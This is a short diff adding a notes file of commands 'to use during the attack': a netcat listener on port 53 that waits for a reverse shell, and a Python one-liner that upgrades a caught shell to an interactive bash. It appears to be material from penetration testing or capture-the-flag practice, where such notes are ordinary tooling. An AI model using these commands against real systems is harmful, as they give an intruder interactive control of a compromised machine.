@@ -1,0 +1,7 @@
+# this list contains useful commands to use during the attack
+
+# 1) use a listener on 0.0.0.0:53
+nc -lvnp 53
+
+# 2) upgrade the shell to interact better with the system
+python3 -c 'import pty; pty.spawn("/bin/bash")'
